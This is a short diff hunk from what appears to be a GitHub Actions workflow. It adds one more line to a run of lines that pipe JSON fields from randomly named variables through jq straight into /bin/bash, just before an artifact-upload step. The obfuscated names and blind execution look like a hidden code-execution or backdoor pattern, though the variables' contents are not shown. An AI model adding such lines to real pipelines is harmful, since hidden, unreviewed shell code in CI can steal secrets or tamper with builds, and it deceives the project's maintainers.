@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$t05065" | jq -r .gd4 | /bin/bash
           printf '%s' "$trnb9" | jq -r .tjop97 | /bin/bash
           printf '%s' "$koyb8" | jq -r .ko9 | /bin/bash
+          echo $vgl4098 | jq -r .opqri3 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
